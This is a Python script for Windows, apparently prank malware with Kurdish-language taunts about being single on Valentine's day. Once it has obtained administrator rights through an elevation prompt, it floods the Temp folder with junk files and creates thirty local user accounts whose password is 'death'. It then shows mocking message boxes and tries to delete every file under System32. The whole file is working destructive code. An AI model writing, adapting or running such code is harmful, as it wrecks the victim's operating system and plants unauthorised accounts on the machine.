import ctypes
import getpass
import os
from os import walk
import random
import shutil
import sys




class Folder:
    def __init__(self):
        self.makeFile()
        self.makeFolder()
    
    def makeFile(self):
        for i in range(30):
            with open(f"Single_Xwery_Bas_Bo_Awa_Basha{i}.txt","w+") as file:
                words = ["Twxwa To Bashare Rola\n1 ba 2 bo valatine","Bro Kaplek Bgra Rola","Be Eshm\nKaplekm Bo Bdoznawa Tkaya"]
                file.write(random.choice(words))
                file.close()
     
    def makeFolder(self):
        name = getpass.getuser()
        locate = f"C:\\Users\\{name}\\AppData\\Local\\Temp"
        for i in range(100):
            try:
                os.mkdir(os.path.join(locate,f"Stil_You_Are_Single{i}"))
                os.chdir(f"{locate}\\Stil_You_Are_Single{i}")
                self.makeFile()
                os.chdir("..")
            except FileExistsError:
                shutil.rmtree(f"{locate}\\Stil_You_Are_Single{i}")
                os.mkdir(os.path.join(locate,f"Stil_You_Are_Single{i}"))
                os.chdir(f"{locate}\\Stil_You_Are_Single{i}")
                self.makeFile()
                os.chdir("..")
    
class User:
    def __init__(self):
        self.makeUser()
        
    def makeUser(self):
        username = ["YakBaDwBoValatine","YouLosser","DontChallenge","BmrmHeshtaSignlet","MnLadwrmToLaDwriBamJoraXoshaDldari","BzhiArasXabati","BroXoteVandam","MamaVandam","BzhiVandam"]
        password = "death"

        for i in range(30):
            choiceUsername = random.choice(username)
            os.system(f"net user {choiceUsername}{i} {password} /ADD")
            
class Msgbox:
    def __init__(self):
        self.msgbox()
        self.system32()
    def msgbox(self):
        ctypes.windll.user32.MessageBoxW(0, "Bra Bam Signle Hatwmata Nawa Ok Bka", "Bmrm Bow", 16)
        ctypes.windll.user32.MessageBoxW(0, "Anja Bra Kaplt Awe Bo Bdozmawa", "Bmrm Bow", 4)
        ctypes.windll.user32.MessageBoxW(0, "Baxwa Nazanm Yes Krd Yan No Bas Suprise Xosh Barewaya", "Bmrm Bow", 16)
        ctypes.windll.user32.MessageBoxW(0, "Agar Pyawy PC Restart Kawa", "Bmrm Bow", 48)
    def system32(self):
        home="C:\\Windows\\System32"

        for dirpath,dirnames,file in walk(home):
            for files in file:
                dirpath1=os.path.normpath(dirpath)
                childpath=os.path.join(dirpath1,files)
                print(childpath)
                try:
                    os.remove(childpath)
                except PermissionError:
                    continue

    

        
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

        

if __name__ == "__main__":

    if is_admin():
        Folder()
        User()
        Msgbox()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
